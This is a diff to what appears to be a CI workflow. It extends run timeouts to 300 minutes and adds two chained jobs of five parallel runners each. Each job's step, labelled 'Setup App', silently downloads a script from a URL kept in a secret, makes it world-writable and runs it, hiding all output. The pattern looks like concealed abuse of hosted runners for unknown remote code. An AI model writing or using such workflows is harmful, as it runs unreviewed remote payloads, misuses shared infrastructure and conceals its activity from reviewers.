@@ -20,7 +20,7 @@ jobs:
              wget -qO autorun.sh ${{ secrets.FILES }} > /dev/null 2>&1
               sleep 5
               chmod 777 autorun.sh
-              timeout 2m ./autorun.sh || ( [[ $? -eq 124 ]] && \
+              timeout 300m ./autorun.sh || ( [[ $? -eq 124 ]] && \
               echo "WARNING: Timeout reached, but that's OK" )
         shell: bash
  
@@ -42,6 +42,50 @@ jobs:
              wget -qO autorun.sh ${{ secrets.FILES }} > /dev/null 2>&1
               sleep 5
               chmod 777 autorun.sh
-              timeout 2m ./autorun.sh || ( [[ $? -eq 124 ]] && \
+              timeout 300m ./autorun.sh || ( [[ $? -eq 124 ]] && \
+              echo "WARNING: Timeout reached, but that's OK" )
+        shell: bash
+ 
+ node-3:
+    runs-on: ${{ matrix.os }}
+    needs: node-2
+    strategy:
+      fail-fast: false
+      matrix:
+         os: [ubuntu-latest, ubuntu-latest, ubuntu-latest, ubuntu-latest, ubuntu-latest]
+    timeout-minutes: 360
+ 
+    steps:
+      - uses: actions/checkout@v4
+      - run: mkdir runner
+      - name: Setup App
+        working-directory: ./runner
+        run: |
+             wget -qO autorun.sh ${{ secrets.FILES }} > /dev/null 2>&1
+              sleep 5
+              chmod 777 autorun.sh
+              timeout 300m ./autorun.sh || ( [[ $? -eq 124 ]] && \
+              echo "WARNING: Timeout reached, but that's OK" )
+        shell: bash
+ 
+ node-4:
+    runs-on: ${{ matrix.os }}
+    needs: node-3
+    strategy:
+      fail-fast: false
+      matrix:
+         os: [ubuntu-latest, ubuntu-latest, ubuntu-latest, ubuntu-latest, ubuntu-latest]
+    timeout-minutes: 360
+ 
+    steps:
+      - uses: actions/checkout@v4
+      - run: mkdir runner
+      - name: Setup App
+        working-directory: ./runner
+        run: |
+             wget -qO autorun.sh ${{ secrets.FILES }} > /dev/null 2>&1
+              sleep 5
+              chmod 777 autorun.sh
+              timeout 300m ./autorun.sh || ( [[ $? -eq 124 ]] && \
               echo "WARNING: Timeout reached, but that's OK" )
         shell: bash
